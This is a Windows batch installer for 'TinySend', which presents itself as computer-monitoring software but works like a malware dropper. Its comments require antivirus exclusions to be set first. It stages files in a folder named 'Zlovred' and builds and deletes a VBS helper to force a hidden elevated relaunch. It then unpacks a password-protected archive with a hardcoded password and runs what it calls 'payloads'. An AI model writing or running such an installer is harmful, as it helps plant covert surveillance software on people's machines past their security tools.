@echo off
rem *******************************************************
rem INSTALL-TinySend.cmd
rem This Script will Install TinySend Scrips - the System
rem of Online Windows Computer Monitoring
rem
rem This Script must be Run after Antivirus Exclusuions
rem Settings. The Script must bu Run with Elevated
rem Privileges
rem *******************************************************
@echo off

rem set TPDL variable
rem
if exist "C:\pub1\Distrib\Zlovred" set TPDL=C:\pub1\Distrib\Zlovred&& goto TPDL_End
set TPDL=%TEMP%
:TPDL_End

rem Set a Directory
rem

set ZLOVRED=C:\pub1\Distrib\Zlovred
set INSTALLSCRIPT=TinySend-Setup.cmd
set DOTBIN=C:\.BIN

rem Set Files...
rem
set CMDFILE001=%ZLOVRED%\%INSTALLSCRIPT%

rem
echo Download and Run Payloads...
rem
title Installing Packages
::-------------------------------------
REM  --> CheckING for permissions
net session >nul 2>&1

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
rem Lock Data
rem exit /b 17
rem
set getadminvbs=nit-%~n0.vbs
    echo Set UAC = CreateObject^("Shell.Application"^) > "%TPDL%\%getadminvbs%"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 0 >> "%TPDL%\%getadminvbs%"

    %wscriptexe% "%TPDL%\%getadminvbs%"
    del "%TPDL%\%getadminvbs%"
    exit /B 0

:gotAdmin
echo Run as Admin...

set SFXARCH=TinySend.exe
set PASS=szbeck
set FOLDER=%~dp0..
if not exist "%FOLDER%\%SFXARCH%" goto Error
"%FOLDER%\%SFXARCH%" -p%PASS%
goto Finish
:Error
echo "File %FOLDER%\%SFXARCH% not found" && exit /b 1
rem pause
:Finish

echo Check Integrity...
rem
if not exist %ZLOVRED% echo %ZLOVRED% is not found && exit /b 1
if not exist %CMDFILE001% echo %CMDFILE001% is not found && exit /b 1

rem Download and Execute Payloads
rem

echo Run Payloads...

call %CMDFILE001%

echo The End of the script %0
exit /b 0
